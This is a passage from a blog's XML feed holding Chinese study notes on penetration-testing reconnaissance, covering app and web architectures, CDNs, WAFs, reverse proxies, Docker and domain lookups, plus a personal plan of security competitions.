    <category term="渗透-信息收集" scheme="https://poison-biao.github.io/tags/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>04APP架构-封装&amp;原生态&amp;H5&amp;flutter</title>
    <link href="https://poison-biao.github.io/du-yu/information-collection-04.html"/>
    <id>https://poison-biao.github.io/du-yu/information-collection-04.html</id>
    <published>2023-07-03T16:00:04.000Z</published>
    <updated>2023-07-06T13:39:54.235Z</updated>
    
    <content type="html"><![CDATA[<h2 id="APP应用开发架构"><a href="#APP应用开发架构" class="headerlink" title="APP应用开发架构"></a>APP应用开发架构</h2><h3 id="1、原生开发"><a href="#1、原生开发" class="headerlink" title="1、原生开发"></a>1、原生开发</h3><p>安卓一般使用java语言开发，当然现在也有kotlin语言进行开发。如何开发就涉及到具体编程了，这里就不详说了。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。</p><p>APP-开发架构-原生态-IDEA</p><h4 id="安全影响：反编译-amp-抓包-amp-常规测试（提取资产信息：1-接口：IP地址、网站域名）"><a href="#安全影响：反编译-amp-抓包-amp-常规测试（提取资产信息：1-接口：IP地址、网站域名）" class="headerlink" title="安全影响：反编译&amp;抓包&amp;常规测试（提取资产信息：1.接口：IP地址、网站域名）"></a>安全影响：反编译&amp;抓包&amp;常规测试（提取资产信息：1.接口：IP地址、网站域名）</h4><h4 id="安全测试：逆向的角度去分析逻辑设计安全；简单安卓逆向，常见抓包"><a href="#安全测试：逆向的角度去分析逻辑设计安全；简单安卓逆向，常见抓包" class="headerlink" title="安全测试：逆向的角度去分析逻辑设计安全；简单安卓逆向，常见抓包"></a>安全测试：逆向的角度去分析逻辑设计安全；简单安卓逆向，常见抓包</h4><h3 id="2、使用H5语言开发（前端语言）"><a href="#2、使用H5语言开发（前端语言）" class="headerlink" title="2、使用H5语言开发（前端语言）"></a>2、使用H5语言开发（前端语言）</h3><p>使用H5开发的好处有很多，可多端复用，比如浏览器端，ios端，当然H5开发的体验是没有原生好的。结合我做过的项目来说，一般是这个页面需要分享出去的话，就用H5开发。</p><h4 id="APP-开发架构-H5-amp-Vue-HBuilderX"><a href="#APP-开发架构-H5-amp-Vue-HBuilderX" class="headerlink" title="APP-开发架构-H5&amp;Vue-HBuilderX"></a>APP-开发架构-H5&amp;Vue-HBuilderX</h4><p>演示：HBuilderX案例</p><p>安全影响：API&amp;JS框架安全问题&amp;JS前端测试</p><h4 id="WX小程序-开发架构-H5-amp-Vue-HBuilderX"><a href="#WX小程序-开发架构-H5-amp-Vue-HBuilderX" class="headerlink" title="WX小程序-开发架构-H5&amp;Vue-HBuilderX"></a>WX小程序-开发架构-H5&amp;Vue-HBuilderX</h4><p>演示：HBuilderX案例</p><p>安全影响：API&amp;JS框架安全问题&amp;JS前端测试</p><h3 id="3、使用flutter开发"><a href="#3、使用flutter开发" class="headerlink" title="3、使用flutter开发"></a>3、使用flutter开发</h3><p>flutter是近年来谷歌推出的一款UI框架，使用dart语言进行开发，支持跨平台，weight渲染直接操作硬件层，体验可媲美原生。但是flutter技术比较新，生态还不完善，开发起来效率相对偏低。</p><h3 id="4、常规Web开发"><a href="#4、常规Web开发" class="headerlink" title="4、常规Web开发"></a>4、常规Web开发</h3><p>Web App软件开发简单地说，就是开发一个网站，然后加入app的壳。Web App一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。</p><h4 id="APP-开发架构–Web封装-封装平台"><a href="#APP-开发架构–Web封装-封装平台" class="headerlink" title="APP-开发架构–Web封装-封装平台"></a>APP-开发架构–Web封装-封装平台</h4><p>演示：ShopXO源码程序+一门APP打包</p><p>安全影响：常Web安全测试</p><h4 id="WX小程序-开发架构-Web封装-平台"><a href="#WX小程序-开发架构-Web封装-平台" class="headerlink" title="WX小程序-开发架构-Web封装-平台"></a>WX小程序-开发架构-Web封装-平台</h4><p>演示：ShopXO源码程序+一门APP打包</p><p>安全影响：常规Web安全测试j</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-05%20012642.png" alt="屏幕截图 2023-06-05 012642"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;APP应用开发架构&quot;&gt;&lt;a href=&quot;#APP应用开发架构&quot; class=&quot;headerlink&quot; title=&quot;APP应用开发架构&quot;&gt;&lt;/a&gt;APP应用开发架构&lt;/h2&gt;&lt;h3 id=&quot;1、原生开发&quot;&gt;&lt;a href=&quot;#1、原生开发&quot; class=&quot;head</summary>
      
    
    
    
    <category term="渗透" scheme="https://poison-biao.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透-信息收集" scheme="https://poison-biao.github.io/tags/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>03Web拓展-CDN&amp;WAF&amp;OSS&amp;反向&amp;负载均衡</title>
    <link href="https://poison-biao.github.io/du-yu/information-collection-03.html"/>
    <id>https://poison-biao.github.io/du-yu/information-collection-03.html</id>
    <published>2023-07-03T16:00:03.000Z</published>
    <updated>2023-07-06T13:39:42.323Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、WAF-：web-Application-firewall"><a href="#一、WAF-：web-Application-firewall" class="headerlink" title="一、WAF ：web Application firewall"></a>一、WAF ：web Application firewall</h2><p>原理：web应用防火墙，保护web</p><p>影响：安全测试手法被拦截</p><p>很难绕过</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604195810154.png" alt="image-20230604195810154"></p><p>、<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604195848213.png" alt="image-20230604195848213"></p><h2 id="二、CDN（Content-Delivery-Network-）"><a href="#二、CDN（Content-Delivery-Network-）" class="headerlink" title="二、CDN（Content Delivery Network ）"></a>二、CDN（Content Delivery Network ）</h2><p>开通后全国分布有节点，超级ping能查到ping通的IP地址</p><p>原理：内容分发服务，旨在提高访问速度 </p><p>影响：隐藏真实源IP，导致对目标测试错误，看到的是节点</p><p>演示：阿里云备案域名全局CDN加速服务</p><p>Windows2012 + BT宝塔面板 + CDN服务</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604195914239.png" alt="image-20230604195914239"></p><h2 id="三、OSS（Object-Storage-Service）"><a href="#三、OSS（Object-Storage-Service）" class="headerlink" title="三、OSS（Object Storage Service）"></a>三、OSS（Object Storage Service）</h2><p>云存储服务，旨在提高访问速度</p><p>阿里云OSS:</p><p>开OSS</p><p>2、新建Bucket</p><p>3、配置Bucket属性</p><p>4、配置Access访问</p><p>原理：</p><p>为什么要使用第三方存储？</p><p>1）静态文件会占用大量带宽</p><p>2）加载速度</p><p>3）存储空间</p><p>影响：</p><p>上传的文件或解析的文件均来自于OSS资源，无法解析，单独存储</p><p>1、修复上传安全</p><p>2、文件解析不一样</p><p>3、但Accesskey隐患</p><h2 id="四、反向代理"><a href="#四、反向代理" class="headerlink" title="四、反向代理"></a>四、反向代理</h2><h3 id="1、正向代理，挂VPN一个意思"><a href="#1、正向代理，挂VPN一个意思" class="headerlink" title="1、正向代理，挂VPN一个意思"></a>1、正向代理，挂VPN一个意思</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604195939721.png" alt="image-20230604195939721"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604200708819.png" alt="image-20230604200708819"></p><h3 id="2、反向代理"><a href="#2、反向代理" class="headerlink" title="2、反向代理"></a>2、反向代理</h3><h4 id="将真实的目标指向任意一个站点"><a href="#将真实的目标指向任意一个站点" class="headerlink" title="将真实的目标指向任意一个站点"></a>将真实的目标指向任意一个站点</h4><p>主机只能访问服务器1，服务器2将数据放到服务器1，主机间接访问服务器2 </p><p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230604200708819.png" alt="image-20230604200708819"></p><h4 id="如果设置了反向代理，比如反向代理设置为baidu-com-x2F"><a href="#如果设置了反向代理，比如反向代理设置为baidu-com-x2F" class="headerlink" title="如果设置了反向代理，比如反向代理设置为baidu.com/"></a>如果设置了反向代理，比如反向代理设置为baidu.com/</h4><h4 id="那么你访问设置了反向代理的网站，就会直接跳转到baidu-com-x2F"><a href="#那么你访问设置了反向代理的网站，就会直接跳转到baidu-com-x2F" class="headerlink" title="那么你访问设置了反向代理的网站，就会直接跳转到baidu.com/"></a>那么你访问设置了反向代理的网站，就会直接跳转到baidu.com/</h4><h2 id="五、负载均衡"><a href="#五、负载均衡" class="headerlink" title="五、负载均衡"></a>五、负载均衡</h2><p>原理：分摊到多个操作单元上进行执行，共同完成工作任务</p><p>影响：有多个服务器加载服务，  测试过程中存在多个目标情况</p><p>演示：Nginx负载均衡配置</p><p>Windows2012 + BT宝塔面板 + Nginx</p><h4 id="定义负载设置（和ISCC实战poc-exe设置原理一样，恶心啊！！ISCC不能在脚本里设置代理，搞了三天！！！）"><a href="#定义负载设置（和ISCC实战poc-exe设置原理一样，恶心啊！！ISCC不能在脚本里设置代理，搞了三天！！！）" class="headerlink" title="定义负载设置（和ISCC实战poc.exe设置原理一样，恶心啊！！ISCC不能在脚本里设置代理，搞了三天！！！）"></a>定义负载设置（和ISCC实战poc.exe设置原理一样，恶心啊！！ISCC不能在脚本里设置代理，搞了三天！！！）</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604204133704.png" alt="image-20230604204133704"></p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-04%20204854.png" alt="屏幕截图 2023-06-04 204854"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、WAF-：web-Application-firewall&quot;&gt;&lt;a href=&quot;#一、WAF-：web-Application-firewall&quot; class=&quot;headerlink&quot; title=&quot;一、WAF ：web Application firewal</summary>
      
    
    
    
    <category term="渗透" scheme="https://poison-biao.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透-信息收集" scheme="https://poison-biao.github.io/tags/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>02Web其他-前后端&amp;软件&amp;Docker&amp;分配站</title>
    <link href="https://poison-biao.github.io/du-yu/information-collection-02.html"/>
    <id>https://poison-biao.github.io/du-yu/information-collection-02.html</id>
    <published>2023-07-03T16:00:02.000Z</published>
    <updated>2023-07-10T03:39:56.811Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、-前后端分离"><a href="#一、-前后端分离" class="headerlink" title="一、 前后端分离"></a>一、 前后端分离</h2><h3 id="源码不同，前端源码和后端源码分离"><a href="#源码不同，前端源码和后端源码分离" class="headerlink" title="源码不同，前端源码和后端源码分离"></a>源码不同，前端源码和后端源码分离</h3><p>安全速度快，但大量数据传输不如传统网站</p><p>开发的框架，API传输数据</p><p>前端页面通过api接口传到后端，后台单独管理（类似于两个网站 ） </p><h3 id="1-前台只负责呈现（so基本没有漏洞）"><a href="#1-前台只负责呈现（so基本没有漏洞）" class="headerlink" title="1.前台只负责呈现（so基本没有漏洞）"></a>1.前台只负责呈现（so基本没有漏洞）</h3><p>js网站传输几乎都是API，基本不会有代码的逻辑性，页面光秃秃 </p><h3 id="2-后台更新影响前台"><a href="#2-后台更新影响前台" class="headerlink" title="2.后台更新影响前台"></a>2.后台更新影响前台</h3><p>后台域名大部分不在前端同域名中（so获取前端权限有可能不会影响后端） 能连接才能影响数据</p><p>扫描的时候找后端域名，如果找不到，查看前端框架有无历史漏洞，如果没有，只能尝试社工或者其他方法了</p><h2 id="二、宝塔-phpstudy（软件搭建的网站）"><a href="#二、宝塔-phpstudy（软件搭建的网站）" class="headerlink" title="二、宝塔+phpstudy（软件搭建的网站）"></a>二、宝塔+phpstudy（软件搭建的网站）</h2><p>(购买阿里云服务器，打开所有安全组，255端口要申请) </p><p>用不同软件搭建网站时，要关闭当前的网站</p><p>一个服务器只能支持一个软件搭建网站，端口会冲突</p><p>所需数据库，中间件不一样的话，也要关</p><p>###1.原理：打包类集成化环境，权限配置或受控制</p><h3 id="2-影响：攻击者权限对比区别（不同软件影响也不同）"><a href="#2-影响：攻击者权限对比区别（不同软件影响也不同）" class="headerlink" title="2.影响：攻击者权限对比区别（不同软件影响也不同）"></a>2.影响：攻击者权限对比区别（不同软件影响也不同）</h3><p>和常规搭建的网站最大区别就是权限区别 </p><p>宝塔：拿到权限后，webshell执行不了，文件管理锁定目录，只能看到当前网站目录，其他目录看不到，没有权限，宝塔自动加了限制    </p><p>phpstudy：whoami 获取用户权限 -administartor</p><p>自己IIS搭建有一半webshell能执行,目录也能查看一般</p><h2 id="三、docker-容器（都是假的，除非逃逸出去）"><a href="#三、docker-容器（都是假的，除非逃逸出去）" class="headerlink" title="三、docker 容器（都是假的，除非逃逸出去）"></a>三、docker 容器（都是假的，除非逃逸出去）</h2><p>原理：虚拟化技术独立磁盘空间，非真实物理环境</p><p>影响：攻击者虚拟空间磁盘 </p><h2 id="四、建站分配站（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）"><a href="#四、建站分配站（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）" class="headerlink" title="四、建站分配站（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）"></a>四、建站分配站（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）</h2><h3 id="1-托管（有版权）（面对的是安全公司）"><a href="#1-托管（有版权）（面对的是安全公司）" class="headerlink" title="1.托管（有版权）（面对的是安全公司）"></a>1.托管（有版权）（面对的是安全公司）</h3><h3 id="2-申请（没有版权）（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）"><a href="#2-申请（没有版权）（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）" class="headerlink" title="2.申请（没有版权）（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）"></a>2.申请（没有版权）（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）</h3><p>原理：利用别人域名模版建立  </p><p>影响：实质安全测试非目标资产</p><h2 id="五、静态Web"><a href="#五、静态Web" class="headerlink" title="五、静态Web"></a>五、静态Web</h2><p>例子：大学学的html设计的网站（单一，想修改页面只能改源代码）</p><p>原理：数据没有传输性（js传输不算）</p><p>影响：无漏洞</p><h2 id="六、伪静态"><a href="#六、伪静态" class="headerlink" title="六、伪静态"></a>六、伪静态</h2><p>动态转为静态技术，伪装的静态</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-04%20181607.png" alt="屏幕截图 2023-06-04 181607"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、-前后端分离&quot;&gt;&lt;a href=&quot;#一、-前后端分离&quot; class=&quot;headerlink&quot; title=&quot;一、 前后端分离&quot;&gt;&lt;/a&gt;一、 前后端分离&lt;/h2&gt;&lt;h3 id=&quot;源码不同，前端源码和后端源码分离&quot;&gt;&lt;a href=&quot;#源码不同，前端源码和后端源</summary>
      
    
    
    
    <category term="渗透" scheme="https://poison-biao.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透-信息收集" scheme="https://poison-biao.github.io/tags/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>01web常规-系统&amp;中间件&amp;数据库&amp;源码</title>
    <link href="https://poison-biao.github.io/du-yu/information-collection-01.html"/>
    <id>https://poison-biao.github.io/du-yu/information-collection-01.html</id>
    <published>2023-07-03T16:00:01.000Z</published>
    <updated>2023-07-06T13:39:29.755Z</updated>
    
    <content type="html"><![CDATA[<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-04%20090622.png" alt="屏幕截图 2023-06-04 090622" style="zoom: 67%;"><h2 id="web四大件作用"><a href="#web四大件作用" class="headerlink" title="web四大件作用"></a>web四大件作用</h2><p>系统、中间件、数据库、源代码</p><h2 id="网站有哪些展示"><a href="#网站有哪些展示" class="headerlink" title="网站有哪些展示"></a>网站有哪些展示</h2><p>子域名模式 </p><p>端口模式</p><p>目录模式</p><p>公司发放的IP，扫描时扫描公司所有的IP</p><p>##文件访问解析</p><p>中间件、解析规则：中间解析规则决定上传到目标是什么类型</p><p>源文件的权限决定</p><p>锁图片文件，依旧可看，但没有执行了，有后门也不行</p><h2 id="源码配置文件"><a href="#源码配置文件" class="headerlink" title="源码配置文件"></a>源码配置文件</h2><p>1.数据库直接放在本地</p><p>2.数据库和网站分离，放在另外一个服务器上</p><p>数据库直接放到云端，拿到数据库账户密码也不行，云端只支持网站源码连接，可能只允许某些账号或目标访问</p><p>app.config数据库配置文件</p><h2 id="源码开源"><a href="#源码开源" class="headerlink" title="源码开源"></a>源码开源</h2><p>开源-源码可见</p><p>开源-源码不可见：各种加密，百度上有ASP加密     ，PHP加密什么的</p><p>语言特性决定：java运行以后就会改变                     </p><p>开源是为了白盒测试-代码审计</p><h2 id="源码结构目录"><a href="#源码结构目录" class="headerlink" title="源码结构目录"></a>源码结构目录</h2><p>admin后台管理相关</p><p>bin指引目录</p><p>database数据库相关</p><p>images图片相关</p><p>js前端文件</p><p>member会员</p><p>template模板</p><p>upfiles文件上传</p><p>webservice网站服务</p><p>##路由访问</p><p>常规：url+文件路径            url和文件目录对应不上，要根据路由配置决定</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><h3 id="常规化"><a href="#常规化" class="headerlink" title="常规化"></a>常规化</h3><p>原理：源码数据都在同服务器</p><p>影响：无，常规安全测试手法</p><h3 id="站库分离："><a href="#站库分离：" class="headerlink" title="站库分离："></a>站库分离：</h3><p>原理：源码数据库不在同服务器</p><p>存储：其他服务器上数据库&amp;云数据库产品</p><p>影响：数据被单独存放，能连接才可影响数据</p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-04%20090622.png&quot; alt=&quot;屏幕截图 202</summary>
      
    
    
    
    <category term="渗透" scheme="https://poison-biao.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透-信息收集" scheme="https://poison-biao.github.io/tags/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>实习-信息收集</title>
    <link href="https://poison-biao.github.io/du-yu/police-practice-01.html"/>
    <id>https://poison-biao.github.io/du-yu/police-practice-01.html</id>
    <published>2023-07-03T16:00:01.000Z</published>
    <updated>2023-07-10T03:30:50.341Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IP查询-amp-域名、网址分析"><a href="#IP查询-amp-域名、网址分析" class="headerlink" title="IP查询&amp;域名、网址分析"></a>IP查询&amp;域名、网址分析</h1><h2 id="总述：赶紧学习啊！！！"><a href="#总述：赶紧学习啊！！！" class="headerlink" title="总述：赶紧学习啊！！！"></a>总述：赶紧学习啊！！！</h2><p>实习第一天，让我解析一下领导留言板的域名：<a href="http://liuyan.people.com.cn/%EF%BC%8C%E5%88%9A%E5%BC%80%E5%A7%8B%E4%BB%A5%E4%B8%BA%E6%98%AF%E6%90%9C%E7%B4%A2IP%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E5%AE%9A%E4%BD%8D%EF%BC%8C%E5%8E%9F%E6%9D%A5%E6%98%AF%E6%8A%8A%E7%9B%B4%E6%8E%A5%E6%8A%8A%E7%BD%91%E5%9D%80%E6%94%BE%E5%88%B0%E7%AB%99%E9%95%BF%E5%B7%A5%E5%85%B7%E9%87%8C%E8%A7%A3%E6%9E%90">http://liuyan.people.com.cn/，刚开始以为是搜索IP地址进行定位，原来是把直接把网址放到站长工具里解析</a></p><h2 id="一、网站IP查询"><a href="#一、网站IP查询" class="headerlink" title="一、网站IP查询"></a>一、网站IP查询</h2><p>想要查询<a href="http://liuyan.people.com.cn/%E7%9A%84IP%E5%9C%B0%E5%9D%80%EF%BC%8C%E4%BD%BF%E7%94%A8">http://liuyan.people.com.cn/的IP地址，使用</a> ping liuyan.people.com.cn </p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710095653955.png" alt="image-20230710095653955"></p><h2 id="二、网址分析"><a href="#二、网址分析" class="headerlink" title="二、网址分析"></a>二、网址分析</h2><p>使用站长工具：<a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></p><p>直接搜索网址</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710101151951.png" alt="image-20230710101151951"></p><p>感觉是<strong>资产收集</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IP查询-amp-域名、网址分析&quot;&gt;&lt;a href=&quot;#IP查询-amp-域名、网址分析&quot; class=&quot;headerlink&quot; title=&quot;IP查询&amp;amp;域名、网址分析&quot;&gt;&lt;/a&gt;IP查询&amp;amp;域名、网址分析&lt;/h1&gt;&lt;h2 id=&quot;总述：赶紧学习啊！</summary>
      
    
    
    
    <category term="实习" scheme="https://poison-biao.github.io/categories/%E5%AE%9E%E4%B9%A0/"/>
    
    
    <category term="实习-信息收集" scheme="https://poison-biao.github.io/tags/%E5%AE%9E%E4%B9%A0-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>Destiny-plan</title>
    <link href="https://poison-biao.github.io/du-yu/destiny-plan.html"/>
    <id>https://poison-biao.github.io/du-yu/destiny-plan.html</id>
    <published>2023-07-03T16:00:01.000Z</published>
    <updated>2023-07-13T07:09:21.743Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、备忘录"><a href="#一、备忘录" class="headerlink" title="一、备忘录"></a>一、备忘录</h1><p>1、美化终端<br>2、复盘<br>3、金砖<br>4、渊龙sec团队招新<br>5、Tryhackme<br>6、看迪宝！！！<br>7、世界战队排名！！<br>8、7月底的护网</p><h1 id="二、护网"><a href="#二、护网" class="headerlink" title="二、护网"></a>二、护网</h1><p>1、面试<br>2、国护！！！</p><h1 id="三、PWN"><a href="#三、PWN" class="headerlink" title="三、PWN"></a>三、PWN</h1><h1 id="四、战队"><a href="#四、战队" class="headerlink" title="四、战队"></a>四、战队</h1><p>WM<br>NUL_1<br>蓝水<br>小猪<br>山海关Arr3sty0u</p><h1 id="五、电子取证"><a href="#五、电子取证" class="headerlink" title="五、电子取证"></a>五、电子取证</h1><h1 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h1><p>1、ISCC线下决赛<br>2、金砖9月报名截止<br>3、蓝帽杯<br>4、强网杯<br>5、天网杯（安全漏洞挖掘大赛）<br>6、公安内网</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、备忘录&quot;&gt;&lt;a href=&quot;#一、备忘录&quot; class=&quot;headerlink&quot; title=&quot;一、备忘录&quot;&gt;&lt;/a&gt;一、备忘录&lt;/h1&gt;&lt;p&gt;1、美化终端&lt;br&gt;2、复盘&lt;br&gt;3、金砖&lt;br&gt;4、渊龙sec团队招新&lt;br&gt;5、Tryhackme&lt;br&gt;6、</summary>
      
    
    
    
    <category term="Destiny" scheme="https://poison-biao.github.io/categories/Destiny/"/>
    
    
    <category term="plan" scheme="https://poison-biao.github.io/tags/plan/"/>
    
  </entry>
  
</feed>
